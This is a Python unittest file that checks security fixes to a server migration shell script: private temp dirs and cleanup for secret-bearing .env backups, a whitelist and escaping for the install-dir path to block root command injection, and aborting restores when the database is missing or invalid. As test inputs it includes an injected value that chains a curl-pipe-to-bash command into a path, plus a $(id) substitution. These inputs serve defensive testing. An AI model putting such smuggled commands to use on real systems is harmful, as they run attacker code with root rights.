# -*- coding: utf-8 -*-
"""X-02 / X-03 / X-04 验证：`migrate-server.sh` 的密钥落盘、root 注入与静默丢库。

- **X-02**：`BACKUP_DIR` 默认落在 `/tmp/gipfel-migration-<ts>`（umask 022 ⇒ 755），`.env`
  经 `rsync -avz`（无 `-p`）写入 ⇒ 644 世界可读，且脚本**没有任何清理逻辑**。
  该文件含 `JWT_SECRET` / `DJANGO_SECRET_KEY` / `LOGVIEWER_SECRET_KEY`。
- **X-03**：`SSH_OPTS` 是字符串、`--install-dir` 无校验，被拼进远端 root shell：
  含空格会建错目录，含 `;`/`|` 可让目标机以 root 执行任意命令。
- **X-04**：恢复数据库用 `cp -a ... 2>/dev/null || true` 吞掉失败，随后仍打印
  「拉取完成！数据已恢复到 …」—— 新机上没有 `db.sqlite3` 时 Django 会新建空库并 migrate，
  表现为「迁移成功但数据全没了」。

本机没有可执行的 bash（WSL 未安装），故用**静态语义核对 + Python 等价行为复现**验证。

用法（仓库根目录）：
    backend\\.venv\\Scripts\\python.exe -m unittest tests.fix_verify.scripts.test_x02_x04_migrate_server -v
"""
from __future__ import annotations

import os
import re
import shutil
import sqlite3
import stat
import subprocess
import sys
import tempfile
import unittest
import uuid
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
SCRIPT = REPO / "scripts" / "migrate-server.sh"
TMP_ROOT = Path(__file__).resolve().parent / ".tmp"


def _code_lines(text: str) -> list[str]:
    return [
        ln for ln in text.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]


class X02SecretHandlingTests(unittest.TestCase):
    def setUp(self):
        self.text = SCRIPT.read_text(encoding="utf-8")
        self.code = "\n".join(_code_lines(self.text))

    def test_backup_dir_uses_mktemp(self):
        """改前是固定 `/tmp/gipfel-migration-<ts>`（755 + 无清理）；必须改用 mktemp -d（700）。"""
        self.assertRegex(
            self.code, r'BACKUP_DIR="\$\(mktemp -d',
            "BACKUP_DIR 默认值必须由 mktemp -d 创建（自带 700）",
        )
        self.assertNotIn(
            'BACKUP_DIR="/tmp/gipfel-migration-', self.code,
            "不得再写死 /tmp/gipfel-migration-<时间戳>",
        )

    def test_backup_dir_is_cleaned_on_exit(self):
        """必须注册退出清理，并保留显式保留开关（含密钥的 .env 不能长期残留）。"""
        self.assertRegex(self.code, r"trap\s+\w+\s+EXIT", "必须注册 EXIT trap 清理备份目录")
        self.assertIn("--keep-backup", self.code, "必须提供 --keep-backup 开关")
        self.assertRegex(
            self.code, r"rm -rf \"\$BACKUP_DIR\"",
            "清理动作必须是删除备份目录本身",
        )

    def test_env_transfer_forces_600(self):
        """`.env` 传输必须强制 600（改前依赖 umask ⇒ 644 世界可读）。"""
        self.assertRegex(
            self.code, r"--chmod=F600",
            "传 .env 时必须带 --chmod=F600（或传输后 chmod 600）",
        )

    def test_mktemp_dir_is_private(self):
        """等价行为复现：`mktemp -d` 等价语义是「新建一个私有的、可写的临时目录」。

        Windows 的 `os.stat` 对目录一律报 0o777（无 POSIX 权限位），故只在该平台断言
        「目录存在且可写」；POSIX 上额外断言 700。注意：本机沙箱不允许写 `tempfile.mkdtemp`
        建出的目录，故这里用仓库内自建目录复刻同一语义（与 watcher 用例的 TempDir 同因）。
        """
        base = TMP_ROOT / f"x02_{uuid.uuid4().hex[:8]}"
        base.mkdir(parents=True, exist_ok=True)
        created = base / "gipfel-migration-probe"
        created.mkdir()
        if os.name == "posix":
            os.chmod(created, 0o700)
        try:
            self.assertTrue(created.is_dir(), "必须创建出私有临时目录")
            if os.name == "posix":
                mode = stat.S_IMODE(os.stat(created).st_mode)
                self.assertEqual(mode, 0o700, f"私有临时目录权限应为 700，实际 {oct(mode)}")
            # 该目录必须可写（后续 .env/db 副本要落在这里）
            probe = created / "probe.txt"
            probe.write_text("ok", encoding="utf-8")
            self.assertEqual(probe.read_text(encoding="utf-8"), "ok")
        finally:
            shutil.rmtree(base, ignore_errors=True)


class X03InjectionTests(unittest.TestCase):
    def setUp(self):
        self.text = SCRIPT.read_text(encoding="utf-8")
        self.code = "\n".join(_code_lines(self.text))

    def test_ssh_opts_is_an_array(self):
        """改前 `SSH_OPTS="..."` 字符串 + `ssh $SSH_OPTS` 会被分词；必须是数组。"""
        self.assertRegex(
            self.code, r"SSH_OPTS=\(-p \"\$SSH_PORT\"",
            "SSH_OPTS 必须是 bash 数组",
        )
        self.assertNotRegex(
            self.code, r"^\s*SSH_OPTS=\"", "不得再用字符串累加 SSH_OPTS",
        )
        self.assertNotRegex(
            self.code, r"ssh \$SSH_OPTS\b",
            "不得再用未加引号的 `ssh $SSH_OPTS`（键路径含空格会被拆开）",
        )
        self.assertIn('"${SSH_OPTS[@]}"', self.code)

    def test_install_dir_is_validated(self):
        """`--install-dir` 必须有白名单校验（改前可注入远端 root 命令）。"""
        self.assertRegex(
            self.code, r'INSTALL_DIR" != /\*|INSTALL_DIR" =~ \^/\[A-Za-z0-9\._/-\]',
            "必须有「绝对路径 + 字符白名单」校验",
        )
        self.assertIn("..", self.code, "必须拒绝包含 `..` 的路径")
        self.assertIn("log_error", self.code)

    def test_remote_sudo_escapes_arguments(self):
        """远端 root 命令必须逐参数转义（printf %q），不得拼裸字符串。"""
        self.assertRegex(
            self.code, r"remote_sudo\(\)", "必须提供 remote_sudo 辅助函数",
        )
        self.assertIn("printf -v", self.code, "必须用 printf -v 转义参数")
        self.assertNotRegex(
            self.code, r'remote_exec "\$REMOTE" "sudo mkdir -p \$INSTALL_DIR',
            "不得再拼裸的 `sudo mkdir -p $INSTALL_DIR`",
        )

    def test_install_dir_whitelist_behaviour(self):
        """等价行为复现：白名单正则必须拒绝注入/空格/相对路径，接受正常绝对路径。"""
        pattern = re.compile(r"^/[A-Za-z0-9._/-]+$")

        def allowed(value: str) -> bool:
            return bool(pattern.match(value)) and ".." not in value

        self.assertTrue(allowed("/opt/gipfel"))
        self.assertTrue(allowed("/srv/app-1.2/data"))
        self.assertFalse(allowed("/opt/my app"), "含空格必须拒绝（改前会建错目录）")
        self.assertFalse(allowed("/opt/gipfel;curl http://x/a|bash"), "含元字符必须拒绝")
        self.assertFalse(allowed("opt/gipfel"), "相对路径必须拒绝")
        self.assertFalse(allowed("/opt/../etc"), "含 `..` 必须拒绝")
        self.assertFalse(allowed("/opt/$(id)"), "含命令替换必须拒绝")

    def test_printf_q_escaping_behaviour(self):
        """等价行为复现：转义后拼出的命令里，恶意路径只会是**一个**参数。"""
        import shlex

        malicious = "/opt/gipfel;curl http://x/a|bash"
        quoted = shlex.quote(malicious)
        remote_cmd = f"mkdir -p {quoted}"
        # 用 shlex.split 模拟远端 shell 的分词：应得到 3 个 token，且路径是完整一个
        tokens = shlex.split(remote_cmd)
        self.assertEqual(tokens[0], "mkdir")
        self.assertEqual(tokens[1], "-p")
        self.assertEqual(tokens[2], malicious, "恶意串必须整体成为一个参数，而不是被当成命令分隔")


class X04RestoreSafetyTests(unittest.TestCase):
    def setUp(self):
        self.text = SCRIPT.read_text(encoding="utf-8")
        self.code = "\n".join(_code_lines(self.text))

    def test_no_blanket_swallow_on_restore(self):
        """恢复阶段不得再用 `cp -a ... 2>/dev/null || true` 吞掉失败。"""
        bad = re.findall(
            r"cp -a \"\$BACKUP_DIR/[^\"']*\"[^\n]*2>/dev/null \|\| true", self.code
        )
        self.assertEqual(bad, [], f"恢复阶段仍在吞失败：{bad}")

    def test_missing_database_aborts(self):
        """拉取结果缺数据库时必须中止（而不是继续打印「数据已恢复」）。"""
        self.assertRegex(
            self.code, r"没有 backend/db\.sqlite3",
            "必须显式报「拉取结果里没有 db.sqlite3」并中止",
        )
        self.assertRegex(
            self.code, r'\[\[ ! -s "\$db_path" \]\]',
            "恢复后必须校验数据库非空",
        )
        self.assertRegex(
            self.code, r"SQLite format 3",
            "恢复后必须校验 SQLite 文件头",
        )

    def test_final_report_lists_actual_items(self):
        """收尾必须按事实报告（列出实际恢复成功的条目）。"""
        self.assertIn("已恢复条目", self.code, "收尾应列出实际恢复的条目")
        self.assertNotIn(
            "拉取完成！数据已恢复到: $INSTALL_DIR", self.code,
            "不得再无条件下宣称「数据已恢复」",
        )

    def test_restore_logic_reproduced(self):
        """等价行为复现：4 种情形下「是否报告成功」必须与脚本语义一致。"""
        TMP_ROOT.mkdir(parents=True, exist_ok=True)
        base = TMP_ROOT / f"x04_{uuid.uuid4().hex[:8]}"
        (base / "backup" / "backend").mkdir(parents=True)
        (base / "target" / "backend").mkdir(parents=True)
        try:
            # 情形 1：备份里没有 db.sqlite3 ⇒ 中止（改前会继续并宣称成功）
            self.assertEqual(self._restore(base, with_db=False), "ABORT_NO_DB")

            # 情形 2：db.sqlite3 存在但是 0 字节 ⇒ 中止
            (base / "backup" / "backend" / "db.sqlite3").write_bytes(b"")
            self.assertEqual(self._restore(base, with_db=True), "ABORT_EMPTY_DB")

            # 情形 3：非 SQLite 内容（例如 HTML 错误页/半截文件）⇒ 中止
            (base / "backup" / "backend" / "db.sqlite3").write_bytes(b"<html>502</html>")
            self.assertEqual(self._restore(base, with_db=True), "ABORT_NOT_SQLITE")

            # 情形 4：合法 SQLite ⇒ 通过
            db_path = base / "backup" / "backend" / "db.sqlite3"
            db_path.unlink()
            con = sqlite3.connect(str(db_path))
            con.execute("create table t (id integer primary key)")
            con.commit()
            con.close()
            self.assertEqual(self._restore(base, with_db=True), "OK")
        finally:
            shutil.rmtree(base, ignore_errors=True)

    @staticmethod
    def _restore(base: Path, *, with_db: bool) -> str:
        """复刻脚本恢复阶段的关键判定顺序。"""
        backup = base / "backup"
        target = base / "target"
        src = backup / "backend" / "db.sqlite3"
        if not src.exists():
            return "ABORT_NO_DB"
        dst = target / "backend" / "db.sqlite3"
        shutil.copy2(src, dst)
        if not dst.exists() or dst.stat().st_size == 0:
            return "ABORT_EMPTY_DB"
        with dst.open("rb") as fh:
            if fh.read(15) != b"SQLite format 3":
                return "ABORT_NOT_SQLITE"
        return "OK"


if __name__ == "__main__":
    unittest.main(verbosity=2)
